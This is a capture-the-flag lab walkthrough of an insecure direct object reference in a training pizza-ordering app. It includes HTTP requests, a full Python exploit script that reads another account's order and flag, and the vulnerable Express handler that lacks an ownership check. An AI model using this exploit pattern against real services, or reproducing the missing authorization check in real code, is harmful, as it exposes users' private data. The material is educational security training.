# cheesy-001 - BugForge Lab Walkthrough

**URL:** https://lab-1783508988294-0xh1mp.labs-app.bugforge.io/
**Difficulty:** Easy
**Vulnerability:** IDOR on the order lookup endpoint - no ownership check
**Flag:** `bug{JrAXMvbTX8Q7UpNUghZwETpRbHg2nZ2w}`

---

## Summary

Cheesy Does It is a pizza ordering React SPA with an Express.js backend. The order detail endpoint, `GET /api/orders/:id`, returns the full order object for any order ID supplied by the caller, with no check that the order belongs to the requesting user. Order IDs are small sequential integers assigned at creation time. Registering a second account, placing an order under it, and then requesting that order's ID while authenticated as a different account returns the victim's full order, including a flag field.

---

## Tech Stack

- Frontend: React SPA (CRA, MUI), JWT in localStorage
- Backend: Express.js, SQLite
- Auth: JWT (HS256)

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|---|---|---|---|
| `/api/register` | POST | No | Standard registration |
| `/api/login` | POST | No | Returns JWT |
| `/api/orders` | POST | JWT | Creates an order for the caller |
| `/api/orders` | GET | JWT | Lists the caller's own orders |
| `/api/orders/:id` | GET | JWT | Vulnerable - no ownership check |

---

## Discovery

### Step 1 - Enumerate the app

Pulling the homepage and its JS bundle surfaces the API routes:

```
/api/login, /api/register, /api/profile, /api/verify-token
/api/menu/pizzas, /api/menu/bases, /api/menu/sauces, /api/menu/toppings
/api/orders, /api/orders/
/api/payment/validate, /api/payment/process
/api/admin/orders, /api/admin/stats, /api/admin/users
```

### Step 2 - Register two accounts

```
POST /api/register {"username":"pentest_a","password":"...","email":"pentest_a@example.com"}
-> user id 4, JWT_A

POST /api/register {"username":"pentest_b","password":"...","email":"pentest_b@example.com"}
-> user id 5, JWT_B
```

### Step 3 - Place an order as the second account

The checkout flow first validates and processes payment, then creates the order:

```
POST /api/payment/validate {"card_number":"4444 4444 4444 4444","exp_month":"12","exp_year":"25","cvv":"123"}
-> {"valid":true}

POST /api/payment/process {"card_number":"4444 4444 4444 4444","amount":10.99}
-> {"success":true,"transaction_id":"..."}
```

The order creation body is built entirely from item names rather than foreign key IDs:

```
POST /api/orders
Authorization: Bearer JWT_B
Content-Type: application/json

{
  "items": [{
    "pizza_name": "Classic Margherita",
    "base_name": "Thin Crust",
    "sauce_name": "Classic Tomato",
    "size": "Medium",
    "toppings": [],
    "quantity": 1,
    "unit_price": 10.99,
    "total_price": 10.99
  }],
  "delivery_address": "123 Secret Lane, User B Town",
  "phone": "5551234567",
  "payment_method": "card",
  "notes": "secret note for B"
}
```

Response:

```json
{"id":4,"order_number":"CDI-1783509371188-ANHCKFF0C","message":"Order created successfully","status":"received"}
```

### Step 4 - Request the same order ID as the first account

```
GET /api/orders/4
Authorization: Bearer JWT_A
```

Response:

```json
{
  "id": 4,
  "user_id": 5,
  "order_number": "CDI-1783509371188-ANHCKFF0C",
  "total_price": 10.99,
  "status": "received",
  "delivery_address": "123 Secret Lane, User B Town",
  "phone": "5551234567",
  "payment_method": "card",
  "notes": "secret note for B",
  "items": [{"pizza_name":"Classic Margherita","base_name":"Thin Crust","sauce_name":"Classic Tomato","size":"Medium","quantity":1,"unit_price":10.99,"total_price":10.99}],
  "flag": "bug{JrAXMvbTX8Q7UpNUghZwETpRbHg2nZ2w}"
}
```

Account A, which owns zero orders of its own, retrieves account B's full order record and the flag, purely by guessing a sequential integer ID.

---

## Exploit

```python
import urllib.request, json

TARGET = "https://lab-1783508988294-0xh1mp.labs-app.bugforge.io"

def post(path, body, tok=None):
    h = {"Content-Type": "application/json"}
    if tok:
        h["Authorization"] = "Bearer " + tok
    req = urllib.request.Request(TARGET + path, data=json.dumps(body).encode(), headers=h)
    return json.loads(urllib.request.urlopen(req).read())

def get(path, tok):
    req = urllib.request.Request(TARGET + path, headers={"Authorization": "Bearer " + tok})
    return json.loads(urllib.request.urlopen(req).read())

reg_a = post("/api/register", {"username": "pentest_a", "email": "pentest_a@example.com", "password": "Passw0rd!123"})
reg_b = post("/api/register", {"username": "pentest_b", "email": "pentest_b@example.com", "password": "Passw0rd!123"})
token_a, token_b = reg_a["token"], reg_b["token"]

post("/api/payment/validate", {"card_number": "4444 4444 4444 4444", "exp_month": "12", "exp_year": "25", "cvv": "123"}, tok=token_b)
post("/api/payment/process", {"card_number": "4444 4444 4444 4444", "amount": 10.99}, tok=token_b)

order = post("/api/orders", {
    "items": [{"pizza_name": "Classic Margherita", "base_name": "Thin Crust", "sauce_name": "Classic Tomato",
               "size": "Medium", "toppings": [], "quantity": 1, "unit_price": 10.99, "total_price": 10.99}],
    "delivery_address": "123 Secret Lane, User B Town",
    "phone": "5551234567",
    "payment_method": "card",
    "notes": "secret note for B"
}, tok=token_b)

victim_order = get(f"/api/orders/{order['id']}", token_a)
print(victim_order["flag"])
# bug{JrAXMvbTX8Q7UpNUghZwETpRbHg2nZ2w}
```

---

## Dead Ends

| Tried | Result |
|---|---|
| Building order items with `pizza_id`/`base_id`/`sauce_id` and object-shaped toppings | Endpoint hangs indefinitely instead of returning an error - the handler expects item fields by name, not ID |
| Sending `address`/`delivery_phone` as field names | Rejected with a validation error - correct fields are `delivery_address` and `phone` |

## Root Cause

The order lookup handler fetches a row by the raw path ID and returns it without comparing the order's `user_id` against the requesting JWT's `id` claim:

```javascript
// Vulnerable pattern (approximate)
app.get('/api/orders/:id', authenticate, async (req, res) => {
  const order = await db.get('SELECT * FROM orders WHERE id = ?', [req.params.id]);
  res.json(order);
});
```

The list endpoint, `GET /api/orders`, correctly scopes results to `req.user.id`, but the single-order lookup endpoint omits the same check entirely.

## CWE / OWASP

- **CWE-639**: Authorization Bypass Through User-Controlled Key (Insecure Direct Object Reference)
- **OWASP A01:2021** - Broken Access Control
